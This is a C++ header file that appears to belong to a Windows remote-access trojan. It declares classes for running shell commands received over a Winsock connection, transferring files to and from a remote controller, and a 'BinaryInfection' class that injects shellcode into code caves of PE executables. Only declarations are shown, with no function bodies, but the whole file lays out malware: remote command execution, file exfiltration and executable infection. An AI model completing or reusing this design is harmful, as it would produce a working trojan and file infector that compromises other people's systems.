#pragma once
#include<iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <time.h>
#include <thread> 
#include <stdlib.h>

#define BUFFERSIZE 1024
#define ERROR_FILE "Error_File";
#define RUNSTATEMENT "start run"
#define RUN_PROGRAM "vrun"

class Command {
	FILE* pipe;
	public:
		int define_result(std::string& result);
		std::string remove_substring(std::string str, std::string demo);
		char* run_command(const char* cmd);
};

class OperateSocket{
	SOCKET socketC;
	bool moderun = false;
	bool wait_for_run();

	protected:
		int get_size_pkt();
		int recv_func(char* buf, int size);
		SOCKET get_socketC();
		void set_socketC(SOCKET s);
	
	public:
		OperateSocket(SOCKET socketC);
		void operate();
		int send_func(char* data, int lenData);
		
};

class ManagerFile : public OperateSocket{
	public:
		ManagerFile(SOCKET socketC);
		int sendFile(LPSTR filename);
		int receiveFile();
};


class BinaryInfection {
	const int JMP_LEN = 5;
	const int SAFE_DIST = 4;

	char* filename;
	char* shellcode;
	char* fileContents;
	IMAGE_NT_HEADERS* ntHeader;

	IMAGE_SECTION_HEADER* find_code_cave(IMAGE_SECTION_HEADER* caveSection, DWORD& caveLoc, DWORD& caveSize);
	public:
		BinaryInfection(const char* filename, const char* shellcode);
		int infect();
		
};